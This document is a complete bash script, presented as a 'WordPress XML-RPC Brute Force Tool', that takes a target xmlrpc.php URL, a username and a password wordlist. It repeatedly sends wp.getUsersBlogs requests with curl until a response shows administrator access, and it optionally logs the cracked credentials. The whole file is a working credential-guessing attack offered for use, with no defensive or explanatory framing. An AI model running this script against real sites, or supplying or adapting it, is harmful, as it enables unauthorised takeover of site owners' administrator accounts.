#!/bin/bash

# Colors for better UX
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
NC="\e[0m" # No Color

# Banner
echo -e "${BLUE}========================================"
echo -e "   WordPress XML-RPC Brute Force Tool"
echo -e "========================================${NC}"

# Ask for user input
read -p "Enter the target URL (e.g., https://example.com/xmlrpc.php): " TARGET
read -p "Enter the username to target: " USERNAME
read -p "Enter the path to the password list: " WORDLIST

# Check if wordlist exists
if [[ ! -f "$WORDLIST" ]]; then
    echo -e "${RED}Error: Password file $WORDLIST not found!${NC}"
    exit 1
fi

# Ask if user wants to save logs
read -p "Do you want to save output to a log file? (y/n): " LOG_CHOICE
if [[ "$LOG_CHOICE" == "y" ]]; then
    LOGFILE="bruteforce_$(date +%F_%H-%M-%S).log"
    echo "[*] Logging to $LOGFILE"
fi

# Rate limiting
read -p "Enter delay between attempts (seconds): " DELAY

# Escape XML special characters
escape_xml() {
    local s="$1"
    s=${s//&/&amp;}
    s=${s//</&lt;}
    s=${s//>/&gt;}
    echo "$s"
}

# Function to log messages if logging enabled
log_message() {
    if [[ "$LOG_CHOICE" == "y" ]]; then
        echo "$1" >> "$LOGFILE"
    fi
}

echo -e "${YELLOW}[*] Starting brute force on $TARGET for user $USERNAME...${NC}"
sleep 1

# Trap Ctrl+C for clean exit
trap "echo -e '\n${RED}[!] Attack stopped by user.${NC}'; exit 1" INT

# Brute force loop
while IFS= read -r PASSWORD; do
    PASSWORD_ESCAPED=$(escape_xml "$PASSWORD")
    echo -e "${BLUE}[*] Trying password: $PASSWORD${NC}"
    log_message "[*] Trying: $PASSWORD"

    PAYLOAD=$(cat <<EOF
<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>$USERNAME</string></value></param>
    <param><value><string>$PASSWORD_ESCAPED</string></value></param>
  </params>
</methodCall>
EOF
)

    RESPONSE=$(curl -s --max-time 10 -d "$PAYLOAD" -H "Content-Type: text/xml" "$TARGET")

    if echo "$RESPONSE" | grep -q "isAdmin"; then
        echo -e "${GREEN}[+] Success! Username: $USERNAME | Password: $PASSWORD${NC}"
        log_message "[+] Success! Username: $USERNAME | Password: $PASSWORD"
        exit 0
    fi

    # Delay between attempts
    sleep "$DELAY"
done < "$WORDLIST"

echo -e "${RED}[!] Brute force attempt completed. No valid credentials found.${NC}"
log_message "[!] Brute force completed. No valid credentials found."
